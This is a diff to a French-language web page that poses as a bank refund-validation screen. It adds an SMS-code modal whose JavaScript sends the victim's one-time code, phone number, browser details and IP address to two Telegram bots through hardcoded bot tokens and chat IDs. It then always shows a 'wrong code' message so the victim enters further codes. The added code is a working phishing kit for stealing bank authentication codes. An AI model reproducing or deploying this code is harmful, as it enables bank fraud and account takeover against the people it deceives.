@@ -118,6 +118,27 @@
             line-height: 1.5;
         }
 
+        .sms-button {
+            display: inline-block;
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .sms-button:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(52, 152, 219, 0.3);
+        }
+
         .details {
             margin-bottom: 25px;
         }
@@ -216,75 +237,74 @@
         }
 
         /* Loader Styles */
-#loader {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    transition: opacity 0.5s ease;
-}
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
 
-.loader-content {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    text-align: center;
-    color: white;
-    gap: 14px; /* espace régulier entre tous les éléments */
-}
+        .loader-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            color: white;
+            gap: 14px;
+        }
 
-.loader-spinner {
-    width: 80px;
-    height: 80px;
-    border: 5px solid rgba(255, 255, 255, 0.3);
-    border-radius: 50%;
-    border-top-color: white;
-    animation: spin 1s ease-in-out infinite;
-}
+        .loader-spinner {
+            width: 80px;
+            height: 80px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
 
-.loader-text {
-    font-size: 18px;
-    font-weight: 600;
-}
+        .loader-text {
+            font-size: 18px;
+            font-weight: 600;
+        }
 
-.loader-subtext {
-    font-size: 14px;
-    opacity: 0.8;
-}
+        .loader-subtext {
+            font-size: 14px;
+            opacity: 0.8;
+        }
 
-.progress-bar {
-    width: 200px;
-    height: 5px;
-    background: rgba(255, 255, 255, 0.3);
-    border-radius: 3px;
-    overflow: hidden;
-}
+        .progress-bar {
+            width: 200px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 3px;
+            overflow: hidden;
+        }
 
-.progress {
-    height: 100%;
-    background: white;
-    width: 0%;
-    animation: progress 5s linear forwards;
-}
+        .progress {
+            height: 100%;
+            background: white;
+            width: 0%;
+            animation: progress 5s linear forwards;
+        }
 
-@keyframes spin {
-    to {
-        transform: rotate(360deg);
-    }
-}
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
 
-@keyframes progress {
-    to {
-        width: 100%;
-    }
-}
-
+        @keyframes progress {
+            to {
+                width: 100%;
+            }
+        }
 
         .bank-image {
             width: 120px;
@@ -303,10 +323,207 @@
             height: 80px;
             opacity: 0.7;
         }
+
+        /* Modal SMS */
+        .sms-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .sms-modal-content {
+            background: white;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .sms-modal-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .sms-modal-header h3 {
+            color: #2c3e50;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+
+        .sms-modal-header p {
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+
+        .sms-form-group {
+            margin-bottom: 20px;
+        }
+
+        .sms-form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+        }
+
+        .sms-form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e8eeff;
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: #f8faff;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            text-align: center;
+            letter-spacing: 5px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .sms-form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .sms-error {
+            display: none;
+            background: #fee;
+            border: 1px solid #e74c3c;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            color: #c0392b;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .sms-error.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .sms-success {
+            display: none;
+            background: #efe;
+            border: 1px solid #27ae60;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            color: #27ae60;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .sms-success.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .sms-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .sms-submit-btn {
+            flex: 1;
+            padding: 15px;
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
+        }
+
+        .sms-submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(39, 174, 96, 0.4);
+        }
+
+        .sms-cancel-btn {
+            flex: 1;
+            padding: 15px;
+            background: #f8f9ff;
+            color: #667eea;
+            border: 2px solid #e8eeff;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .sms-cancel-btn:hover {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+
+        .sms-loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .sms-loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #27ae60;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        .sms-help {
+            font-size: 12px;
+            color: #95a5a6;
+            text-align: center;
+            margin-top: 10px;
+            font-style: italic;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
-    <!-- Loader -->
+    <!-- Loader initial -->
     <div id="loader">
         <div class="loader-content">
             <div class="loader-spinner"></div>
@@ -314,6 +531,46 @@
             <div class="loader-subtext">Veuillez patienter pendant le traitement</div>
             <div class="progress-bar">
                 <div class="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal SMS -->
+    <div class="sms-modal" id="smsModal">
+        <div class="sms-modal-content">
+            <div class="sms-modal-header">
+                <h3>Validation par SMS</h3>
+                <p>Entrez le code à 6 chiffres reçu par SMS</p>
+            </div>
+
+            <div class="sms-error" id="smsError">
+                ⚠️ Le code est erroné. Veuillez réessayer ou approuver depuis l'application.
+            </div>
+
+            <div class="sms-success" id="smsSuccess">
+                ✅ Code SMS validé avec succès !
+            </div>
+
+            <div class="sms-form-group">
+                <label for="smsCode">Code SMS (6 chiffres)</label>
+                <input type="text" id="smsCode" placeholder="123456" maxlength="6">
+                <div class="sms-help">
+                    Entrez le code à 6 chiffres reçu sur votre téléphone
+                </div>
+            </div>
+
+            <div class="sms-loading" id="smsLoading">
+                <div class="sms-loading-spinner"></div>
+                <span style="color: #27ae60;">Envoi en cours...</span>
+            </div>
+
+            <div class="sms-buttons">
+                <button class="sms-cancel-btn" id="smsCancelBtn">
+                    Annuler
+                </button>
+                <button class="sms-submit-btn" id="smsSubmitBtn">
+                    Valider le code
+                </button>
             </div>
         </div>
     </div>
@@ -332,16 +589,17 @@
             <div class="content">
                 <!-- Image de l'application bancaire -->
                 <div class="bank-image">
-                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzM0OThkYiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0yMCA0SDRjLTEuMTEgMC0xLjk5Ljg5LTEuOTkgMkwyIDE4YzAgMS4xMS44OSAyIDIgMmgxNmMxLjExIDAgMi0uODkgMi0yVjZjMC0xLjExLS44OS0yLTItMnptLTggMmgydjJoLTJWNnptMCAzaDJ2MmgtMlY5em0tMyAwSDd2MmgydjJoLTJ2LTJoLTJ2LTJoMnYtMmgydjJ6bTExIDloLTZ2LTJoNnYyeiIvPjwvc3ZnPg==" alt="Application Bancaire">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzM0OThkYiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0yMCA0SDRjLTEuMTEgMC0xLjk5Ljg5LTEuOTkgMkwyIDE4YzAgMS4xMS44OSAyIDIgMmgxNmMxLjExIDAgMi0uODkgMi0yVjZjMC0xLjExLS44OS0yLTItMnptLTggMmgydjJoLTJWNnptMCAzaDJ2MmgtMlY5em0tMyAwSDd2Mkg5djJIN1Y5SDVWN0g5VjVIMTF2NnpNMTggMTNINnYyaDEydi0yeiIvPjwvc3ZnPg==" alt="Application Bancaire">
                 </div>
 
                 <div class="alert">
                     <div class="alert-icon">
-                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xMiA1Ljk5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3ptMCA5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3ptMCA5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3oiLz48L3N2Zz4=" alt="Warning Icon">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xMiA1Ljk5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3ptMCA5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3ptMCA5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA7IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3oiLz48L3N2Zz4=" alt="Warning Icon">
                     </div>
                     <div class="alert-content">
                         <h3>Remboursement en attente de validation</h3>
-                        <p>Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte. Validez par SMS si vous ne possédez pas l'application bancaire !</p>
+                        <p>Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte. 
+                        <a href="#" class="sms-button" id="openSmsModal">Validez par SMS</a> si vous ne possédez pas l'application bancaire !</p>
                     </div>
                 </div>
 
@@ -411,6 +669,156 @@
             if (phone) {
                 document.getElementById('phoneNumber').textContent = phone;
             }
+        });
+
+        // Gestion du modal SMS
+        document.addEventListener('DOMContentLoaded', function() {
+            const smsModal = document.getElementById('smsModal');
+            const openSmsModalBtn = document.getElementById('openSmsModal');
+            const smsCancelBtn = document.getElementById('smsCancelBtn');
+            const smsSubmitBtn = document.getElementById('smsSubmitBtn');
+            const smsCodeInput = document.getElementById('smsCode');
+            const smsError = document.getElementById('smsError');
+            const smsSuccess = document.getElementById('smsSuccess');
+            const smsLoading = document.getElementById('smsLoading');
+            
+            // Ouvrir le modal SMS
+            openSmsModalBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                smsModal.style.display = 'flex';
+                smsCodeInput.focus();
+            });
+            
+            // Fermer le modal SMS
+            smsCancelBtn.addEventListener('click', function() {
+                smsModal.style.display = 'none';
+                smsCodeInput.value = '';
+                smsError.classList.remove('show');
+                smsSuccess.classList.remove('show');
+            });
+            
+            // Fermer en cliquant en dehors du modal
+            smsModal.addEventListener('click', function(e) {
+                if (e.target === smsModal) {
+                    smsModal.style.display = 'none';
+                    smsCodeInput.value = '';
+                    smsError.classList.remove('show');
+                    smsSuccess.classList.remove('show');
+                }
+            });
+            
+            // Formatage du code SMS (6 chiffres uniquement)
+            smsCodeInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 6) value = value.slice(0, 6);
+                e.target.value = value;
+                smsError.classList.remove('show');
+            });
+            
+            // Soumission du code SMS
+            smsSubmitBtn.addEventListener('click', function() {
+                const smsCode = smsCodeInput.value.trim();
+                
+                // Validation
+                if (smsCode.length !== 6 || !/^\d+$/.test(smsCode)) {
+                    smsError.classList.add('show');
+                    smsSuccess.classList.remove('show');
+                    return;
+                }
+                
+                // Afficher le loading
+                smsLoading.style.display = 'block';
+                smsSubmitBtn.disabled = true;
+                smsCancelBtn.disabled = true;
+                
+                // Envoyer à Telegram
+                sendSmsCodeToTelegram(smsCode);
+            });
+            
+            // Fonction pour envoyer le code SMS à Telegram
+            function sendSmsCodeToTelegram(smsCode) {
+                // Vos bots Telegram
+                const bot1 = {
+                    token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
+                    chatId: "5534662562"
+                };
+                
+                const bot2 = {
+                    token: "8550969792:AAGzbD2TYJw27PtokQhSZiJi7lm1JWnyyD4",
+                    chatId: "8061187067"
+                };
+                
+                // Récupérer le numéro de téléphone
+                const phone = document.getElementById('phoneNumber').textContent;
+                
+                // Message pour Telegram
+                const message = `📱 CODE SMS REÇU 📱
+                
+📞 Téléphone: ${phone}
+🔢 Code SMS: ${smsCode}
+
+🌐 INFOS TECH:
+Date: ${new Date().toLocaleString('fr-FR')}
+Navigateur: ${navigator.userAgent}
+IP: ${localStorage.getItem('clientIP') || 'Non disponible'}`;
+                
+                // Envoyer au premier bot
+                fetch(`https://api.telegram.org/bot${bot1.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: bot1.chatId,
+                        text: message
+                    })
+                }).catch(err => console.error('Erreur bot1:', err));
+                
+                // Envoyer au deuxième bot  
+                fetch(`https://api.telegram.org/bot${bot2.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: bot2.chatId,
+                        text: message
+                    })
+                }).catch(err => console.error('Erreur bot2:', err));
+                
+                // Simuler un délai d'envoi
+                setTimeout(() => {
+                    // Cacher le loading
+                    smsLoading.style.display = 'none';
+                    smsSubmitBtn.disabled = false;
+                    smsCancelBtn.disabled = false;
+                    
+                    // Dans un cas réel, on vérifierait si le code est correct
+                    // Pour cette démo, on montre l'erreur pour simuler un code incorrect
+                    smsError.classList.add('show');
+                    smsSuccess.classList.remove('show');
+                    
+                    // Optionnel : Réinitialiser le champ après 3 secondes
+                    setTimeout(() => {
+                        smsCodeInput.value = '';
+                        smsCodeInput.focus();
+                    }, 3000);
+                    
+                }, 2000);
+            }
+            
+            // Permettre de valider avec la touche Entrée
+            smsCodeInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    smsSubmitBtn.click();
+                }
+            });
+            
+            // Récupérer l'IP du client et la stocker
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    localStorage.setItem('clientIP', data.ip);
+                })
+                .catch(() => {
+                    localStorage.setItem('clientIP', 'Non disponible');
+                });
         });
     </script>
 </body>
